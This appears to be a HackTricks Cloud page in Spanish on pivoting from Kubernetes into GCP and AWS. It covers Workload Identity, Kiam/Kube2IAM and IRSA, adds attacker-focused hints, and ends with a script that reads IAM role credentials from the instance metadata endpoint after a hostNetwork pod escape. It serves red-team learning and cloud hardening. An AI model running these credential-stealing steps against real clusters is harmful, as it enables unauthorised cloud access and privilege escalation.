# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## GCP

Si est치s ejecutando un cl칰ster k8s dentro de GCP, probablemente querr치s que alguna aplicaci칩n en ejecuci칩n dentro del cl칰ster tenga acceso a GCP. Hay 2 formas comunes de hacerlo:

### Montar claves de GCP-SA como secreto

Una forma com칰n de dar **acceso a una aplicaci칩n de Kubernetes a GCP** es:

* Crear una Cuenta de Servicio de GCP
* Asignar los permisos deseados a la cuenta
* Descargar una clave json de la SA creada
* Montarla como un secreto dentro de la c치psula
* Establecer la variable de entorno GOOGLE\_APPLICATION\_CREDENTIALS apuntando al camino donde se encuentra el json.

{% hint style="warning" %}
Por lo tanto, como un **atacante**, si comprometes un contenedor dentro de una c치psula, debes verificar esa **variable de entorno** y **archivos json** con credenciales de GCP.
{% endhint %}

### Relacionar json de GSA con secreto de KSA

Una forma de dar acceso a una GSA a un cl칰ster de GKE es vincul치ndolos de la siguiente manera:

* Crea una cuenta de servicio de Kubernetes en el mismo espacio de nombres que tu cl칰ster de GKE utilizando el siguiente comando:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Crea un Secreto de Kubernetes que contenga las credenciales de la cuenta de servicio de GCP a la que deseas otorgar acceso al cl칰ster de GKE. Puedes hacer esto utilizando la herramienta de l칤nea de comandos `gcloud`, como se muestra en el siguiente ejemplo:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Vincula el Secreto de Kubernetes a la cuenta de servicio de Kubernetes usando el siguiente comando:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
En el **segundo paso** se establecieron las **credenciales de la GSA como secreto de la KSA**. Entonces, si puedes **leer ese secreto** desde **dentro** del cl칰ster **GKE**, puedes **escalar a esa cuenta de servicio de GCP**.
{% endhint %}

### Identidad de Carga de Trabajo de GKE

Con la Identidad de Carga de Trabajo, podemos configurar una [cuenta de servicio de Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) para actuar como una [cuenta de servicio de Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Las pods que se ejecutan con la cuenta de servicio de Kubernetes se autenticar치n autom치ticamente como la cuenta de servicio de Google al acceder a las API de Google Cloud.

Los **primeros pasos** para habilitar este comportamiento son **habilitar la Identidad de Carga de Trabajo en GCP** ([**pasos**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) y crear la cuenta de servicio de GCP que deseas que k8s impersone.

* **Habilitar la Identidad de Carga de Trabajo** en un nuevo cl칰ster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Crear/Actualizar un nuevo nodepool** (Los cl칰steres de Autopilot no necesitan esto)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Crear la **Cuenta de Servicio de GCP para hacerse pasar por** desde K8s con permisos de GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Con칠ctate** al **cluster** y **crea** la **cuenta de servicio** a utilizar

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Vincular el GSA con el KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Ejecute un **pod** con el **KSA** y verifique el **acceso** al **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Verifique el siguiente comando para autenticarse en caso necesario:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Como atacante dentro de K8s, debes **buscar SAs** con la **anotaci칩n `iam.gke.io/gcp-service-account`** ya que indica que el SA puede acceder a algo en GCP. Otra opci칩n ser칤a intentar abusar de cada KSA en el cl칰ster y verificar si tiene acceso.\
Desde GCP siempre es interesante enumerar los enlaces y saber **a qu칠 acceso est치s dando a los SAs dentro de Kubernetes**.
{% endhint %}

Este es un script para **iterar f치cilmente sobre todas las definiciones de los pods** buscando esa **anotaci칩n**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role for Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Una forma (obsoleta) de asignar roles IAM a los Pods es utilizar un [**Kiam**](https://github.com/uswitch/kiam) o un [**Kube2IAM**](https://github.com/jtblin/kube2iam) **servidor**. B치sicamente necesitar치s ejecutar un **daemonset** en tu cl칰ster con un **tipo de rol IAM privilegiado**. Este daemonset ser치 el encargado de otorgar acceso a los roles IAM a los pods que lo necesiten.

En primer lugar, necesitas configurar **qu칠 roles pueden ser accedidos dentro del espacio de nombres**, y lo haces con una anotaci칩n dentro del objeto de espacio de nombres:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Una vez que el espacio de nombres est칠 configurado con los roles IAM que los Pods pueden tener, puedes **indicar el rol que deseas en cada definici칩n de pod con algo como**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Como atacante, si **encuentras estas anotaciones** en pods o namespaces o un servidor kiam/kube2iam en ejecuci칩n (probablemente en kube-system) puedes **hacerte pasar por cualquier r**ol que ya est칠 **usado por los pods** y m치s (si tienes acceso a la cuenta de AWS, enumera los roles).
{% endhint %}

#### Crear Pod con Rol IAM

{% hint style="info" %}
El rol IAM a indicar debe estar en la misma cuenta de AWS que el rol kiam/kube2iam y ese rol debe poder acceder a 칠l.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### Rol de IAM para Cuentas de Servicio de K8s a trav칠s de OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Este es el **m칠todo recomendado por AWS**.

1. En primer lugar, necesitas [crear un proveedor OIDC para el cl칰ster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Luego creas un rol de IAM con los permisos que la SA requerir치.
3. Crea una [relaci칩n de confianza entre el rol de IAM y la SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nombre (o los espacios de nombres que otorgan acceso al rol a todas las SAs del espacio de nombres). _La relaci칩n de confianza verificar치 principalmente el nombre del proveedor OIDC, el nombre del espacio de nombres y el nombre de la SA_.
4. Finalmente, **crea una SA con una anotaci칩n que indique el ARN del rol**, y los pods que se ejecuten con esa SA tendr치n **acceso al token del rol**. El **token** est치 **escrito** dentro de un archivo y la ruta se especifica en **`AWS_WEB_IDENTITY_TOKEN_FILE`** (predeterminado: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Para **obtener aws usando el token** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ejecuta:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Como atacante, si puedes enumerar un cl칰ster de K8s, verifica las **cuentas de servicio con esa anotaci칩n** para **escalar a AWS**. Para hacerlo, simplemente **ejecuta/crea** un **pod** utilizando una de las **cuentas de servicio privilegiadas de IAM** y roba el token.

Adem치s, si est치s dentro de un pod, verifica variables de entorno como **AWS\_ROLE\_ARN** y **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
A veces la **Pol칤tica de Confianza de un rol** puede estar **mal configurada** y en lugar de dar acceso AssumeRole a la cuenta de servicio esperada, lo da a **todas las cuentas de servicio**. Por lo tanto, si eres capaz de escribir una anotaci칩n en una cuenta de servicio controlada, puedes acceder al rol.

Consulta la **siguiente p치gina para m치s informaci칩n**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Encontrar Pods y SAs con Roles de IAM en el Cl칰ster

Este es un script para **iterar f치cilmente sobre todos los pods y definiciones de sas** buscando esa **anotaci칩n**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Rol IAM del Nodo

La secci칩n anterior trataba sobre c칩mo robar Roles IAM con pods, pero ten en cuenta que un **Nodo del** cl칰ster de K8s va a ser una **instancia dentro de la nube**. Esto significa que es altamente probable que el Nodo vaya a **tener un nuevo rol IAM que puedes robar** (_nota que usualmente todos los nodos de un cl칰ster de K8s tendr치n el mismo rol IAM, por lo que puede que no valga la pena intentar verificar en cada nodo_).

Sin embargo, hay un requisito importante para acceder al punto final de metadatos desde el nodo, necesitas estar en el nodo (쯥esi칩n ssh?) o al menos tener la misma red:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Robar Token de Rol IAM

Anteriormente hemos discutido c칩mo **adjuntar Roles IAM a Pods** o incluso c칩mo **escapar al Nodo para robar el Rol IAM** que la instancia tiene adjunto a ella.

Puedes usar el siguiente script para **robar** las nuevas credenciales de **rol IAM** en las que has trabajado arduamente:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referencias

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos en** **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
